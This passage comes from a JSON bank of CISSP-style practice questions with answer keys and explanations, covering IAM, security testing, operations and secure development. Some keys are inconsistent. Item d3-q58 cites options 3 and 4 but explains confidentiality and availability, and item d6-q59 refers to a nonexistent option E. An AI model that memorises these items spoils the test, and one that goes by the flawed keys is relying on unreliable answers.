      "explanation": "Option 1 is correct. The most likely reason for unmanaged accounts on the end application is either the application is managed manually or partially. With Closed-loop automated application Integration, the IAM system manages all the accounts on the application. If anyone creates an unmanaged account on the application, via periodic sync, the IAM system will detect and manage (delete) the account on the application."
    },
    {
      "id": "d5-q53",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "In the Kerberos Authentication mechanism, the Key Distribution Center (KDC) requires all accounts to use pre-authentication. Pre-authentication is used to restrict which of the following attacks?",
      "choices": [
        "Sniffing",
        "Man-in-the-middle attack",
        "Password-guessing",
        "Golden Ticket"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. The Key Distribution Centre (KDC) is available as part of the domain controller and performs two key functions: Authentication Service (AS) and Ticket-Granting Service (TGS) By default, the KDC requires all accounts to use pre-authentication. This is a security feature that offers protection against password-guessing attacks. The AS request identifies the client to the KDC in plain text. If pre-authentication is enabled, a timestamp will be encrypted using the user's password hash as an encryption key. If the KDC reads a valid time when using the user's password hash, which is available in the Active Directory, to decrypt the time stamp, the KDC knows that the request isn't a replay of a previous request. When you do not enforce pre-authentication, a malicious attacker can directly send a dummy request for authentication. The KDC will return an encrypted TGT and the attacker can brute force it offline."
    },
    {
      "id": "d6-q54",
      "domain": "6. Security Assessment and Testing",
      "stem": "Order the following steps of the Software Testing Life Cycle in the correct order: A. Test Planning B. Requirement Analysis C. Test Execution D. Test Case Designing E. Test Closure F. Test Environment Setup?",
      "choices": [
        "B -> A -> F -> D - > C -> E",
        "B -> A -> D -> F - > C -> E",
        "B -> A -> D -> C - > F -> E",
        "B -> D -> A -> F - > C -> E"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. There are 6 major phases of STLC, which occur in the following order: Requirement Analysis: The SRD is ready and shared with the stakeholders, and the testing team starts a high-level analysis concerning the AUT (Application under Test). Test Planning Test: The Team plans the strategy and approach. Test Case Designing: Develop the test cases based on scope and criteria. Test Environment Setup: The integrated environment is ready to validate the product. Test Execution: Real-time validation of the product and finding bugs. Test Closure: Once testing is completed, the matrix, reports, and results are documented."
    },
    {
      "id": "d6-q55",
      "domain": "6. Security Assessment and Testing",
      "stem": "During an Internal Audit, several issues were found in your enterprise and the results have been presented to Senior Management. Which option decisions is least likely to be taken by Senior Management?",
      "choices": [
        "Discuss the recommendations with SMEs",
        "Take corrective action to fix the issues",
        "Update the Organization policies to make sure these issues are handled organization-wide",
        "Review the existing policies to find the gap"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. Fixing issues is not the responsibility of Senior Management; their first step is to review the Audit results and recommendations. This may involve reviewing the existing policies, standards, and procedures to identify the gaps and decide on the steps needed to handle the situation. Based on the recommendations, Risk Analysis needs to be done and the results need to be reviewed. In case of any change, Change Management procedures must be followed."
    },
    {
      "id": "d6-q56",
      "domain": "6. Security Assessment and Testing",
      "stem": "A cloud-based SaaS service provider is working on a new SaaS application. At what stage must they involve the Penetration Testing Team?",
      "choices": [
        "During the Design Phase",
        "During the Testing Phase",
        "After Prod Release",
        "Before Prod release"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. In general, a pen test should be done right before a system is put into production, once the system is no longer in a state of constant change. A pen test is not a one-time task. Networks and computer systems are dynamic, meaning that they do not stay the same for very long."
    },
    {
      "id": "d6-q57",
      "domain": "6. Security Assessment and Testing",
      "stem": "Your enterprise performs regular vulnerability assessments to define, identify, classify, and prioritize vulnerabilities. However, even after regularly getting no warning from the vulnerability assessment tools, they have recently been breached. What could be the reason behind this?",
      "choices": [
        "Vulnerability Scanners only detect known vulnerabilities",
        "The systems are not patched",
        "Vulnerability Assessments do not detect Phishing attacks",
        "Vulnerability Assessments do not define the risks associated with the vulnerabilities"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. Vulnerability scanning helps businesses identify known vulnerabilities and security misconfigurations. Generally, the scanners have a database of known vulnerabilities which it tries to identify in the system. This gives room to unknown vulnerabilities or Zero-day vulnerabilities."
    },
    {
      "id": "d6-q58",
      "domain": "6. Security Assessment and Testing",
      "stem": "The sales department is adding a new API layer to their existing application Interface. This will allow other teams to fetch sales app data programmatically, within the enterprise. Which option testing types is least likely to be performed in this scenario?",
      "choices": [
        "Interface Testing",
        "Regression Testing",
        "Alpha Testing",
        "Beta Testing"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. Beta Testing is conducted at one or more customer sites by end-users of the software. This version is released for a limited number of users for testing in a real-time environment. In the described scenario, since the product is being used internally, Beta Testing is least likely to be done of the available options. Alpha Testing (3) is a type of validation testing. It is a type of acceptance testing which is done before the product is released to customers. It is typically done by QA people. Interface Testing (1) is defined as a software testing type that verifies whether the communication between two different software systems is done correctly. Since in the above scenario, a new interface is being developed, it is highly probable that Interface testing will be performed. Regression testing (2) is a software testing practice that ensures an application still functions as expected after any code changes, updates, or improvements. Regression testing is responsible for the overall stability and functionality of existing features. Since, in the above scenario, a new feature is being added, regression testing must be performed."
    },
    {
      "id": "d6-q59",
      "domain": "6. Security Assessment and Testing",
      "stem": "A recent Security Audit suggested incorporating a SIEM system to consolidate the logs and monitor events. Which option events should be captured in the logs? (Select all options that apply)",
      "choices": [
        "System Access events",
        "Shutdown or system restart events",
        "Modification of Data",
        "Application Failures"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "The correct answers are options 1, 2, 3, and 4. As per the NIST SP 800-92 the following events should be logged: • Operating System (OS) Eventsstart-up up and shut down of the system • start up and down of a service • network connection changes or failures • changes to, or attempts to change, system security settings and controls • OS Audit Records • log on attempts (successful or unsuccessful) • the function(s) performed after logged on (e.g., reading or updating critical file, software installation) • account changes (e.g., account creation and deletion, account privilege assignment) • successful/failed use of privileged accounts • Application Account Information • successful and failed application authentication attempts • application account changes (e.g., account creation and deletion, account privilege assignment) • use of application privileges • Application operations • application start-up and shutdown • application failures • major application configuration changes • application transactions Amongst the options above, Private File Creation and Confidential Email Attachment download will generally not be logged in the SIEM systems as this is the operation that takes place locally on the user endpoint machine. There are other controls to handle email attachment malware detection etc. Therefore, E is incorrect."
    },
    {
      "id": "d6-q60",
      "domain": "6. Security Assessment and Testing",
      "stem": "During a recent attack, attackers exploited your corporation's newly launched application. The attackers exploited the buffer overflow vulnerability in the new system. Which option testing methodologies could have been missed?",
      "choices": [
        "User Acceptance Testing",
        "Use Case Testing",
        "System Integration Testing",
        "Misuse Case Testing"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. The Buffer Overflow attack is generally caused when the testing strategies do not include input validation or misuse case testing. Misuse case testing is a process used by software testers to evaluate the vulnerability of their software to known risks. Testers first enumerate the known misuse cases and then attempt to exploit those use cases with manual and/or automated attack techniques."
    },
    {
      "id": "d6-q61",
      "domain": "6. Security Assessment and Testing",
      "stem": "An enterprise's Security Policy mandates Periodic Recertification of Privileged Accounts, Service Accounts, and Temporary Accounts by the respective application owners as is required by Industry Regulations. Which option systems are generally used for Recertifications?",
      "choices": [
        "Identity Management System",
        "Privileged Access Management System",
        "Identity Governance System",
        "Security Information and Event Management System"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. Identity governance (IG) is a subcategory of identity and access management (IAM) that emerged from the needs of organizations to comply with regulatory requirements such as the Sarbanes-Oxley Act (SOX) and the Health Insurance Portability and Accountability Act (HIPAA). Identity governance provides organizations with better visibility of identities and access privileges and better controls to detect and prevent inappropriate access. Identity governance solutions are designed to link people, applications, data, and devices to allow customers to determine who has access to what, what kind of risk that represents, and to take action in situations where policy violations are identified. Identity Management System (1) is the next choice. Often, Identity Governance systems are a subset of Identity Management Systems, but this is not always the case. PAM systems (2) manage Privileged Accounts and often provide the capabilities of Privilege Account Management, Password Management, etc. However, they are generally not used for Recertification or UAR, nor do they manage Temporary Accounts. Answer option 4, Security information and event management (SIEM), refers to a category of software products and services that combine security information management (SIM) and security event management (SEM). They provide real-time analysis of security alerts generated by applications and networked hardware. Vendors sell SIEM as software, as appliances, or as managed services, and these products are also used to log security data and generate reports for compliance purposes."
    },
    {
      "id": "d6-q62",
      "domain": "6. Security Assessment and Testing",
      "stem": "Based on the enterprise's BCP, the administrator team backs up the critical Infrastructure every day as per the Security Policy. What is the best way to validate the backups?",
      "choices": [
        "Validate the Audit logs of the backup processes",
        "Make sure the backup hardware and storage infrastructure is protected",
        "Compare the data between the actual system and backups",
        "Restore systems from the backups"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. The best way to validate the backups is by occasionally restoring and testing the backups to ensure that the data is intact and has maintained its integrity."
    },
    {
      "id": "d6-q63",
      "domain": "6. Security Assessment and Testing",
      "stem": "The infamous SONY Data Breach was caused by a Phishing Attack. What is the best way to ensure that enterprises are protected against Phishing Attacks?",
      "choices": [
        "Multifactor Authentication",
        "Education and Awareness",
        "Data Backups",
        "Patching"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. All of the above are valid protection mechanisms against Data Breaches, but the best protection mechanism against Phishing is Education and Training. Enterprises should educate and train their employees to be wary of any communication that requests personal or financial information. They should also instruct employees to report the threat to the company's security operations team immediately. This is generally done by Phishing Simulation, which is designed to test the effectiveness of the Security Awareness program."
    },
    {
      "id": "d6-q64",
      "domain": "6. Security Assessment and Testing",
      "stem": "During the feature testing of a Third Party vendor product that is used enterprise-wide, the testing team found an issue. Upon evaluation, it is found that it is an issue with the product. What is the best way to handle this issue?",
      "choices": [
        "Contact Vendor",
        "Involve the development team to fix the issue",
        "Since this is a security issue, contact the consumer court",
        "Evaluate alternative products"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. The best way to handle and report the issue in the product is by reporting it to the Vendor. As per the principle of Ethical Disclosure, any vulnerability if found, should be reported to the vendor and they should be allowed sufficient time to fix the issue."
    },
    {
      "id": "d6-q65",
      "domain": "6. Security Assessment and Testing",
      "stem": "Which option audits is considered to be the most effective way to evaluate security controls in an enterprise?",
      "choices": [
        "Internal Audits",
        "External Audits",
        "Third-Party Audits",
        "Security Control Assessments"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. Third-Party Audits are generally considered to be the most effective way to evaluate Security Controls within an organization. Third-party audits are independent, impartial, audits with the objective of assessing the level of conformity of a management system to certain audit criteria. It is independent of the customer-supplier relationship and is free of any conflict of interest. The independence of the audit organization is a key component of a third-party audit."
    },
    {
      "id": "d7-q53",
      "domain": "7. Security Operations",
      "stem": "After a recent Digital Payments Server hack, law enforcement was involved to investigate the crime scene. The law enforcement team collected evidence from the affected systems. Following the evidence collection and handling best practices, from which of the following sources should data be collected first?",
      "choices": [
        "CPU Cache",
        "Hard Disk",
        "Virtual Memory",
        "Magnetic Tapes"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. In forensics, the order of volatility refers to the order in which you should collect evidence. Highly volatile data is easily lost, such as data in memory when you turn off a computer. The least volatile forms of data, such as printouts, are relatively permanent. First responders need to understand the order of volatility to ensure they protect any potential evidence. The most volatile data includes data in CPU registers, caches, and memory. It is lost when the computer is rebooted. Virtual memory (a swap file) is stored on a disk drive but is rebuilt when the computer is rebooted. Data on disk drives will stay there, often even after a user attempts to delete it. Backups on tapes and optical discs have a very low level of volatility. Similarly, remote logs have a very low level of volatility."
    },
    {
      "id": "d7-q54",
      "domain": "7. Security Operations",
      "stem": "Your enterprise's Security Administration Team recently installed an Intrusion Detection System (IDS) which will help the enterprise strengthen its attack detection capability. However, during its operation, the Administration Team encountered many false positives. Which option techniques works best to reduce the number of false positives?",
      "choices": [
        "Place the IDS after the DMZ that will warrant valid traffic",
        "Establish IDS policies to handle known false positives",
        "Keep the IDS updated with the most recent security patches",
        "Place the IDS behind the firewall"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. An improperly tuned IDS will generate an overwhelming number of false positives. Establishing a policy that removes known False Positives will save time in future investigations and prevent unwarranted escalations. An IDS is generally placed after the firewall. Placing the IDS in this location allows it to do its job on all traffic that gets through the edge firewall and provides an extra layer of protection for the DMZ. The DMZ is the most vulnerable part of your network since it contains your public servers such as Internet-accessible web servers, DNS servers, and front-end mail servers."
    },
    {
      "id": "d7-q55",
      "domain": "7. Security Operations",
      "stem": "Security Configuration Management Process is comprised of the following steps: 1. Controlling Configuration Changes 2. Planning 3. Identifying and Implementing Configurations 4. Monitoring Which option options specifies the correct sequence of the Security Configuration Management?",
      "choices": [
        "1 -> 2 -> 3 -> 4",
        "2 -> 3 -> 1 -> 4",
        "2 -> 1-> 3 -> 4",
        "3 -> 2-> 1 -> 4"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. As per the NIST SP 800-128, security-focused configuration management of systems involves a set of activities that can be organized into four major phases: Planning -> Identifying and Implementing Configurations -> Controlling Configuration Changes -> Monitoring"
    },
    {
      "id": "d7-q56",
      "domain": "7. Security Operations",
      "stem": "During an Audit of a financial enterprise, it was found that many Service Accounts used were admin accounts with full admin capabilities of the underlying systems. Which option security concepts is violated in this case?",
      "choices": [
        "Separation of Duties",
        "Privilege Account Management",
        "Need to Know",
        "Least Privilege"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. The principle of least privilege is the idea that any user, program, or process should have only the bare minimum privileges necessary to perform its function. For example, a user account created for pulling records from a database doesn't need admin rights, while a programmer whose main function is updating lines of legacy code doesn't need access to financial records. This principle states that a user shall only have access to the information that their job function requires, regardless of their security clearance level or other approvals. In other words: a user needs permissions AND a Need-to-know, and that Need-to-know is strictly bound to a real requirement for the User to fulfill their current role."
    },
    {
      "id": "d7-q57",
      "domain": "7. Security Operations",
      "stem": "Amina, a trainee, found a shining USB pen drive in the common public area in front of the office compound. Intrigued, she connected the pen drive to her office laptop which led to the automatic installation of malware. Which option approaches would be the best protection against this scenario?",
      "choices": [
        "Antimalware Software",
        "Employee security awareness training",
        "Blocking USB devices",
        "Scanning employees every time they enter the building"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. In the described scenario, employee security awareness training is the most effective way to protect against this type of cyber threat by teaching employees not to insert untrusted removable media into their computers. If for some reason an employee needs to plug in the flash drive, then the organization should have a process to handle such a case (i.e., testing the USB drive in a sandbox environment for various malicious activities). Installation of Antimalware software is critical to handle the situation once the system gets affected; however, the first line of defense is employee awareness training followed by other protection controls (defense in depth)."
    },
    {
      "id": "d7-q58",
      "domain": "7. Security Operations",
      "stem": "It has been discovered that the Chief Information Officer's (CIO) corporate account has been compromised recently with a sophisticated Whaling attack. The attackers compromised the data and encrypted the contents of the CIO's laptop which contains many confidential files. In this scenario, what is the next step that the Incident Management Team will perform?",
      "choices": [
        "Preparation",
        "Detection and Analysis",
        "Containment, Eradication, and Recovery",
        "Post-Event Activity"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. The NIST incident response lifecycle breaks incident response down into four main phases: Preparation; Detection and Analysis; Containment, Eradication, and Recovery; and Post-Event Activity. Given the described scenario, the next step for the Incident Management Team would be to analyze the impact of the attack. Analysis is right after detection. Even though it is found that the CIO's laptop contents are encrypted, it is crucial to analyze whether the attack is limited just to the CIO's laptop, or if it has impacted other systems as well."
    },
    {
      "id": "d7-q59",
      "domain": "7. Security Operations",
      "stem": "The Security Team advocated for a honeypot server in the recent meeting with Senior Management. What is the primary goal of implementing Honeypots?",
      "choices": [
        "Document violations",
        "Entice attackers",
        "Entrap attackers",
        "Challenge attackers"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. The primary goal of implementing honeypots/honeynets is to understand the behavior of attacks and document any violations. This helps the security team be better prepared for any potential attacks. Entrapment refers to an illegal practice in which law enforcement persuades someone to commit a crime when the person otherwise had no intention to. Enticement refers to a practice in which law enforcement makes conditions for commission favorable, but the person is already determined to commit the crime. Challenging the attackers is never the goal of implementing Honeypot/Honeynet systems."
    },
    {
      "id": "d7-q60",
      "domain": "7. Security Operations",
      "stem": "Patch Tuesday is the term used to refer to when Microsoft, Adobe, Oracle, and others regularly release software patches for their software products. Which option options is the least likely reason for installing patches?",
      "choices": [
        "To fix Configuration issues",
        "Security",
        "Feature Improvement",
        "Compliance"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. Fixing configuration is not the reason to install a patch. Patch management is important for the following key reasons: Security: Patch management fixes vulnerabilities in your software and applications that are susceptible to cyber-attacks, helping your organization to reduce its security risk. System uptime: Patch management ensures your software and applications are kept up-to-date and that they run smoothly, supporting system uptime. Compliance: With the continued rise in cyber-attacks, organizations are often required by regulatory bodies to maintain a certain level of compliance. Patch management is a necessary piece of adhering to compliance standards. Feature improvements: Patch management can go beyond software bug fixes to also include feature/functionality updates. Patches can be critical to ensuring that you have the latest and greatest that a product has to offer."
    },
    {
      "id": "d7-q61",
      "domain": "7. Security Operations",
      "stem": "Aiko recently completed the ITIL Certification which advocates implementing the Change Management Process in the Enterprise. Arrange the following steps in the correct sequence of the Change Management Process. A. Documenting the changes. B. Testing the changes. C. Creating requests for changes. D. Reviewing requests for changes. E. Approve/Reject changes. F. Schedule and Implement changes. Select the correct sequence of steps from the given options:?",
      "choices": [
        "C -> D -> E -> B -> F -> A",
        "C -> D -> B -> E -> F -> A",
        "C -> D -> E -> F -> B -> A",
        "C -> E -> D -> B -> F -> A"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. ITIL change management is a process designed to understand and minimize risks while making IT changes. Businesses have two main expectations of the services provided by IT: the services should be stable, reliable, and predictable, and the services should be able to change rapidly to meet evolving business requirements. 1. Creating requests for changes (RFC) 2. Reviewing requests for changes. 3. Approving/Rejecting changes. 4. Testing changes. 5. Scheduling and Implementing changes. 6. Documenting changes."
    },
    {
      "id": "d8-q35",
      "domain": "8. Software Development Security",
      "stem": "Your enterprise has recently implemented the Software Assurance Maturity Model (SAMM) which provides a way to analyze and improve the secure development lifecycle. Which option features is not provided by SAMM?",
      "choices": [
        "Audit an organization's existing software development tools",
        "Build a balanced software security assurance program in well-defined iterations",
        "Demonstrate concrete improvements to a security assurance program",
        "Define and measure security-related activities throughout an organization"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. The Software Assurance Maturity Model (SAMM) is an open framework to help organizations formulate and implement a software security strategy tailored to specific risks the organization is facing. SAMM helps you: * Evaluate an organization's existing software security practices * Build a balanced software security assurance program in well-defined iterations (2) * Demonstrate concrete improvements to a security assurance program (3) * Define and measure security-related activities throughout an organization (4)"
    },
    {
      "id": "d8-q36",
      "domain": "8. Software Development Security",
      "stem": "Alpine Corp is a Business Software Solution development business that follows the Agile model for implementing custom software solutions. Which option principles is least aligned to the Agile Model?",
      "choices": [
        "Business people and developers must work together daily throughout the project.",
        "Working software is the primary measure of progress.",
        "The art of minimizing the amount of work not done is essential.",
        "At regular intervals, the team reflects on how to become more effective, then tunes and adjusts its behavior accordingly."
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. Out of the given options, the principle of minimizing the amount of work not done is least aligned to the Agile model. On the contrary, in the Agile model the art of maximizing the work not done is essential. The following principles are based on the Agile Manifesto: • Our highest priority is to satisfy the customer through early and continuous delivery of valuable software. • Welcome changing requirements, even late in development. Agile processes harness change for the customer's competitive advantage. • Deliver working software frequently, from a couple of weeks to a couple of months, with a preference for the shorter timescale. • Business people and developers must work together daily throughout the project. • Build projects around motivated individuals. Give them the environment and support they need, and trust them to get the job done. • The most efficient and effective method of conveying information to and within a development team is face-to-face conversation. • Working software is the primary measure of progress. • Agile processes promote sustainable development. The sponsors, developers, and users should be able to maintain a constant pace indefinitely. • Continuous attention to technical excellence and good design enhances agility. • Simplicity – the art of maximizing the amount of work not done – is essential. • The best architectures, requirements, and designs emerge from self-organizing teams. • At regular intervals, the team reflects on how to become more effective, then tunes and adjusts its behavior accordingly."
    },
    {
      "id": "d8-q37",
      "domain": "8. Software Development Security",
      "stem": "ABC Inc is struggling with a source code management issue. As the development team grows, code management is becoming a big issue. Which option source code management practices is least likely to be considered a best practice?",
      "choices": [
        "Ensure you're working from the latest version",
        "Review changes before committing",
        "Make detailed notes",
        "Don't Commit often"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. Source code management (SCM) or Version Control is used to track modifications to a source code repository. SCM tracks a running history of changes to a code base and helps resolve conflicts when merging updates from multiple contributors. The best practices of SCM are as follows: • Commit often • Ensure you're working from the latest version • Review changes before committing • Make detailed notes • Agree on a Workflow"
    },
    {
      "id": "d8-q38",
      "domain": "8. Software Development Security",
      "stem": "The security team wants to enhance Security Response capabilities such that they could automatically respond to many commonly occurring incidents. Which option options will they most likely consider?",
      "choices": [
        "SIEM",
        "UEBA",
        "SOAR",
        "EDR"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. SOAR (Security Orchestration, Automation, and Response) refers to a collection of software solutions and tools that allow organizations to streamline security operations. It enables organizations to collect inputs monitored by the security operations team. For example, alerts from the SIEM system and other security technologies (where incident analysis and triage can be performed by leveraging a combination of human and machine power) help define, prioritize, and drive standardized incident response activities."
    },
    {
      "id": "d8-q39",
      "domain": "8. Software Development Security",
      "stem": "ABC Corp follows a Change and Configuration management process where each change request follows the Change Control Process. Align the Change Control activities in the correct order. A. Assess B. Build C. Submission of RFC D. Review E. Implement F. Test?",
      "choices": [
        "C -> D -> A -> B -> F -> E",
        "C -> A -> D -> B -> E -> F",
        "C -> A -> D -> B -> F -> E",
        "C -> A -> D -> F -> B -> E"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. Change Control is used to ensure that changes to a product or system are introduced in a controlled and coordinated manner. It reduces the possibility that unnecessary changes will be introduced to a system without forethought, introducing faults into the system or undoing changes made by other users of the software. The goals of a change control procedure usually include minimal disruption to services, reduction in back-out activities, and cost-effective utilization of resources involved in implementing change. The correct sequence of the Change Control process is: • Submission of RFC • Assess • Review • Build • Test • Implement • Close"
    },
    {
      "id": "d8-q40",
      "domain": "8. Software Development Security",
      "stem": "Your enterprise uses the COTS Identity Management Software. Recently the Vendor Support Team contacted your security team informing them that there is a security patch released by the vendor. They suggested you implement it. What is the next step your security team should perform?",
      "choices": [
        "Install the patch on your PROD env as this is a security issue",
        "Review the patch on your non-PROD env and do regression testing",
        "Review the patch changes and add them to the backlog to install them in the next available release",
        "Since this is a security patch, harden your enterprise ingress/egress points"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. In this situation, review the patch on your non-prod environment and do regression testing to validate if the existing features and functions of your IAM system work as intended. Once that is done, the Security Patch should be installed on the PPTE or other environments, and validation must be completed. Once everything is reviewed based on the change control process, the Security Patch must be applied to the PROD environment."
    },
    {
      "id": "d8-q41",
      "domain": "8. Software Development Security",
      "stem": "Your startup recently received huge funding, and you plan to expand your technology infrastructure. You plan to use the cloud services for your development team such that they just manage the development code and the rest will be managed by the cloud service provider. Which model suits this scenario the best?",
      "choices": [
        "IaaS",
        "PaaS",
        "SaaS",
        "Hybrid"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. PaaS, or Platform-as-a-Service, is a cloud computing model that provides customers a complete cloud platform—hardware, software, and infrastructure—for developing, running, and managing applications without the cost, complexity, and inflexibility that often come with building and maintaining that platform on-premises. Examples of PaaS models are AWS Elastic Beanstalk, Windows Azure, Heroku, Force.com, Google App Engine, and OpenShift."
    },
    {
      "id": "d8-q42",
      "domain": "8. Software Development Security",
      "stem": "According to the OWASP Top 10 Web Application Vulnerabilities Report, Broken Access Control issues were found in 94% of applications. Which option controls is least effective against Broken Access Control?",
      "choices": [
        "Except for public resources, deny by default.",
        "Implement access control mechanisms once and re-use them throughout the application",
        "Log access control failures and alert admins when appropriate (e.g., repeated failures).",
        "Model access controls should be based on the user's right to perform operations like create, read, update, or delete any record."
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. Per the OWASP Top 10 Report, to handle Broken Access Control, we need to model access controls that should enforce record ownership rather than accepting that the user can create, read, update, or delete any record. Other Controls include: • Except for public resources, deny by default. • Implement access control mechanisms once and re-use them throughout the application, including minimizing Cross-Origin Resource Sharing (CORS) usage. • Unique application business limit requirements should be enforced by domain models. • Disable web server directory listing and ensure file metadata (e.g.,. git) and backup files are not present within web roots. • Log access control failures, and alert admins when appropriate (e.g., repeated failures). • Rate limit API and controller access to minimize the harm from automated attack tooling. • Stateful session identifiers should be invalidated on the server after logout."
    },
    {
      "id": "d8-q43",
      "domain": "8. Software Development Security",
      "stem": "Arif recently found that his email address got updated on one of the social networking websites. This led to account compromise. Upon checking his browsing history, he found the URL as https://letsconnect.com/email/change?email=thatsthepriceyoupaidforfreemusic@teamail.com. What is the most likely cause for this?",
      "choices": [
        "CSRF",
        "XSS",
        "SQL Injection",
        "Insecure Direct Object References"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same-origin policy, which is designed to prevent different websites from interfering with each other."
    },
    {
      "id": "d3-q57",
      "domain": "3. Security Architecture and Engineering",
      "stem": "A software business is planning to migrate some critical infrastructure to a cloud environment. As a security consultant, you have been tasked with finding a cost-effective solution that will help the enterprise offload hardware and patching requirements but keep control over its applications and data. What solution would you propose?",
      "choices": [
        "Private cloud - PaaS",
        "Public cloud - SaaS",
        "Community cloud - IaaS",
        "Public cloud - PaaS"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. Cloud service providers (CSP) mainly offer 4 types of cloud deployment models: a) Private cloud: Underlying infrastructure and resources are dedicated to a single organization. This model offers better performance and security but at a high cost. b) Community cloud: A similar group of organizations share the infrastructure and resources provided by the CSP. It is costlier than the public cloud but cheaper than a private cloud. c) Public cloud: Multiple organizations share the same underlying infrastructure and resources hosted by the CSP. It is a cost-effective model compared to private and community models. d) Hybrid cloud: A combination of two or more of the models described above. Each deployment model consists of different service models that define responsibilities between the vendor and the cloud provider a) Software As a Service (SaaS) – The CSP bears all the responsibilities of the infrastructure. Providing the application, maintaining the software with patches and hardware replacements. b) Infrastructure As a Service (IaaS) - The customer takes the responsibility of maintaining the application, securing the data, and patching the OS while the CSP retains the responsibility of providing Infrastructure services like networking, server infrastructure, and virtualization. c) Platform As a Service (PaaS) – This service model gives the organization complete control over the application and data while assigning the patching and hardware responsibility to the cloud vendor."
    },
    {
      "id": "d3-q58",
      "domain": "3. Security Architecture and Engineering",
      "stem": "The CEO of the business wants to send a secure message to a member of the board of directors (BOD). They create a digest of the message they want to send by running it through the hashing algorithm. They then encrypt the message digest with their private key and send the message, along with the encrypted digest, to the relevant member of the BOD. Which security principles/concepts are NOT upheld by this process? (Select TWO)",
      "choices": [
        "Confidentiality",
        "Integrity",
        "Non-repudiation",
        "Availability"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "The correct answers are options 3 and 4. Neither confidentiality nor availability are upheld. The scenario described in the question implies the CEO used digital signatures to send a secure message to the board member. When a member of the BOD receives the plaintext message along with the encrypted message digest, they will decrypt the digest using the CEO's public key. This verifies that the message has come from the CEO (Authentication) and since it was encrypted with their private key, they cannot deny having sent that message later (non-repudiation). After decrypting the message digest, the member of the BOD will run the plaintext message through the same hashing algorithm and will compare the output hash value with the decrypted hash. If both the values match then the message was unaltered in transit (Integrity). Since the original message was sent in plain text, an attacker could easily read the message in transit. Therefore, it does not provide confidentiality. Digital signatures are not used to maintain system uptime or high availability, so it does not uphold availability either."
    },
    {
      "id": "d2-q47",
      "domain": "2. Asset Security",
      "stem": "A business decides to outsource its configuration management program to a third-party vendor. They want to ensure that minimum security controls are configured on the newly imaged machines. What should the business provide to the third-party vendor to ensure these requirements are met?",
      "choices": [
        "Policy document",
        "Best practice guidelines for system configuration",
        "Baseline configuration",
        "Procedure document"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. A baseline configuration is the minimum security that every system in the organization should have. This ensures that security controls are implemented consistently throughout the organization. More stringent controls can be implemented on top of the security baseline depending on the criticality of any given system. A policy (1) is a high-level document, approved by senior management, which does not specify security details. The best practice guidelines (2) are recommendations but are not mandatory. A procedure document (4) can be specific to a particular piece of software, or system, and it does not define the minimum security controls required."
    },
    {
      "id": "d5-q54",
      "domain": "5. Identity and Access Management (IAM)",
